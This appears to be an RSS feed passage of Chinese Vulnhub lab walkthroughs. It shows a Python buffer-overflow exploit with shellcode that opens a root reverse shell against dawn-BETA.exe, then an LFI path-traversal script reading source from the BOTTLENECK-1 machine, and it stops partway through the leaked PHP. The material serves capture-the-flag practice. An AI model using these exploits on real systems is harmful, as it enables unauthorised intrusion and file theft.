&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>看来靶机上1435端口运行的是dawn-BETA.exe&lt;/p>
&lt;p>同理重新来一遍&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">#!/usr/bin/python2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">socket&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">sys&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">os&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip = &lt;span style="color:#cd5555">&amp;#34;10.0.2.7&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>port = &lt;span style="color:#b452cd">1435&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buf = &lt;span style="color:#cd5555">b&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buf += &lt;span style="color:#cd5555">b&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\xba\x6e\x48\x71\x2c\xdb\xcd\xd9\x74\x24\xf4\x5e\x31&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buf += &lt;span style="color:#cd5555">b&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\xc9\xb1\x12\x31\x56\x12\x03\x56\x12\x83\xa8\x4c\x93&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buf += &lt;span style="color:#cd5555">b&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\xd9\x05\x96\xa4\xc1\x36\x6b\x18\x6c\xba\xe2\x7f\xc0&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buf += &lt;span style="color:#cd5555">b&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\xdc\x39\xff\xb2\x79\x72\x3f\x78\xf9\x3b\x39\x7b\x91&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buf += &lt;span style="color:#cd5555">b&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\xb1\xb9\x79\x6e\xae\xbb\x7d\x71\x92\x35\x9c\xc1\x8c&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buf += &lt;span style="color:#cd5555">b&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x15\x0e\x72\xe2\x95\x39\x95\xc9\x1a\x6b\x3d\xbc\x35&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buf += &lt;span style="color:#cd5555">b&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\xff\xd5\x28\x65\xd0\x47\xc0\xf0\xcd\xd5\x41\x8a\xf3&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buf += &lt;span style="color:#cd5555">b&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x69\x6e\x41\x73&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buff = &lt;span style="color:#cd5555">&amp;#34;A&amp;#34;&lt;/span>*&lt;span style="color:#b452cd">13&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>eip = &lt;span style="color:#cd5555">&amp;#39;&lt;/span>&lt;span style="color:#cd5555">\x13\x15\x50\x52&lt;/span>&lt;span style="color:#cd5555">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nullByte = &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x00&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nops = &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x90&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span> * &lt;span style="color:#b452cd">24&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>inputBuffer = buff + eip + nops + buf + nullByte
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s.connect((ip, port))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s.send(inputBuffer)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>获得root权限反弹shell&lt;/p>- https://www.vulnhub.cn/walkthrough/424/ - This is a customized copyright.</description></item><item><title>Vulnhub 374 BOTTLENECK-1</title><link>https://www.vulnhub.cn/walkthrough/374/</link><pubDate>Sat, 28 Sep 2019 00:00:00 +0000</pubDate><guid>https://www.vulnhub.cn/walkthrough/374/</guid><description>Vulnhub靶机教程 https://www.vulnhub.cn/walkthrough/374/ -&lt;p>考点：python2,lfi&lt;/p>
&lt;p>靶机链接：&lt;a href="https://www.vulnhub.com/entry/bottleneck-1,374/">https://www.vulnhub.com/entry/bottleneck-1,374/&lt;/a>&lt;/p>
&lt;h2 id="环境配置">环境配置&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>名称&lt;/th>
&lt;th>IP&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Kali Linux&lt;/td>
&lt;td>10.0.2.24&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>BOTTLENECK-1&lt;/td>
&lt;td>10.0.2.34&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="初步打点">初步打点&lt;/h2>
&lt;h3 id="端口扫描">端口扫描&lt;/h3>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#658b00">export&lt;/span> &lt;span style="color:#00688b">rip&lt;/span>=10.0.2.34
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo nmap -v -A -p- &lt;span style="color:#00688b">$rip&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh OpenSSH 7.9p1 Ubuntu &lt;span style="color:#b452cd">10&lt;/span> (Ubuntu Linux; protocol 2.0)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssh-hostkey:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">2048&lt;/span> be:e0:d5:75:76:ea:d4:f3:91:77:f9:47:20:7d:bf:a4 (RSA)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">256&lt;/span> 7a:34:90:c0:59:d1:db:63:bd:4e:ca:5e:6f:ee:e7:2d (ECDSA)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ &lt;span style="color:#b452cd">256&lt;/span> c9:b9:66:ce:28:ad:b7:b3:d9:bb:ed:22:0d:e4:45:db (ED25519)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http nginx
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: BOTTLENECK
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: GET HEAD POST
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="web测试">web测试&lt;/h3>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ gobuster dir --url http://10.0.2.34/ -w /usr/share/wordlists/dirb/big.txt -x .php
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/css (Status: 301) [Size: 162] [--&amp;gt; http://10.0.2.34/css/]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/image_gallery.php (Status: 200) [Size: 6381]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/img (Status: 301) [Size: 162] [--&amp;gt; http://10.0.2.34/img/]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/index.php (Status: 200) [Size: 10175]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/js (Status: 301) [Size: 162] [--&amp;gt; http://10.0.2.34/js/]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/vendor (Status: 301) [Size: 162] [--&amp;gt; http://10.0.2.34/vendor/]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/374/1.webp" alt="1">&lt;/p>
&lt;p>访问查看源代码发现图片地址不是静态的&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/374/2.webp" alt="2">&lt;/p>
&lt;p>刷新后图片返回为空&lt;/p>
&lt;h4 id="参数t">参数t&lt;/h4>
&lt;p>参数t看样子是时间戳&lt;/p>
&lt;p>编写脚本对比时间戳与本地时间戳&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>import os,requests,re,time
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>from bs4 import BeautifulSoup
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00688b">url&lt;/span> = &lt;span style="color:#cd5555">&amp;#39;http://10.0.2.34/image_gallery.php&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00688b">res&lt;/span> = requests.get(url)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00688b">soup&lt;/span> = BeautifulSoup(res.content,&lt;span style="color:#cd5555">&amp;#39;html.parser&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22"># print(soup)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00688b">grept&lt;/span> = soup.select(&lt;span style="color:#cd5555">&amp;#39;img&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00688b">grept&lt;/span> = grept[0]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(str(grept)[55:65])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(int(time.time()))
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/374/3.webp" alt="3">&lt;/p>
&lt;p>延迟8或9秒&lt;/p>
&lt;h4 id="参数f">参数f&lt;/h4>
&lt;p>参数f的值 &lt;code>Ym90dGxlbmVja19kb250YmUucG5n&lt;/code>可base64解密&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/374/4.webp" alt="4">&lt;/p>
&lt;p>盲猜这里可以任意文件读取&lt;/p>
&lt;p>编写脚本尝试读取文件&lt;code>image_gallery.php&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>import base64,time
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>from importlib.resources import path
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>import time,requests
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00688b">timestamp&lt;/span> = str(int(time.time())+8)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00688b">path&lt;/span>=b&lt;span style="color:#cd5555">&amp;#39;../image_gallery.php&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00688b">file&lt;/span> = base64.b64encode(path)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00688b">file&lt;/span>=file.decode(&lt;span style="color:#cd5555">&amp;#34;utf-8&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00688b">url&lt;/span> = &lt;span style="color:#cd5555">&amp;#39;http://10.0.2.34/image_gallery.php?t=&amp;#39;&lt;/span>+ timestamp +&lt;span style="color:#cd5555">&amp;#39;&amp;amp;f=&amp;#39;&lt;/span>+file
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#cd5555">&amp;#39;http://10.0.2.34/img/&amp;#39;&lt;/span> + path.decode(&lt;span style="color:#cd5555">&amp;#34;utf-8&amp;#34;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(url)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00688b">res&lt;/span> = requests.get(url)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(res.text)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>读取到文件&lt;code>image_gallery.php&lt;/code>的代码&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php+HTML" data-lang="php+HTML">&amp;lt;?php
/*
CHANGELOG
v1.1: Still testing without content.
I&amp;#39;ve fixed that problem that @p4w and @ska notified me after hacker attack.
Shit I&amp;#39;m too lazy to make a big review of my code.
I think that the LFI problem can be mitigated with the blacklist.
By the way to protect me from attackers, all malicious requests are immediately sent to the SOC
v1.0: Starting this beautiful gallery
*/
$tstamp = time();
if(isset($_GET[&amp;#39;t&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;f&amp;#39;])){
include_once &amp;#39;image_gallery_load.php&amp;#39;;
exit();
}
?&amp;gt;
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;meta charset=&amp;#34;utf-8&amp;#34;&amp;gt;
&amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1, shrink-to-fit=no&amp;#34;&amp;gt;
&amp;lt;meta name=&amp;#34;description&amp;#34; content=&amp;#34;&amp;#34;&amp;gt;
&amp;lt;meta name=&amp;#34;author&amp;#34; content=&amp;#34;bytevsbyt3&amp;#34;&amp;gt;
&amp;lt;title&amp;gt;BOTTLENECK&amp;lt;/title&amp;gt;
&amp;lt;link href=&amp;#34;vendor/bootstrap/css/bootstrap.min.css&amp;#34; rel=&amp;#34;stylesheet&amp;#34;&amp;gt;
&amp;lt;link href=&amp;#34;vendor/fontawesome-free/css/all.min.css&amp;#34; rel=&amp;#34;stylesheet&amp;#34; type=&amp;#34;text/css&amp;#34;&amp;gt;
&amp;lt;link href=&amp;#34;css/agency.css&amp;#34; rel=&amp;#34;stylesheet&amp;#34;&amp;gt;
&amp;lt;/head&amp;gt;
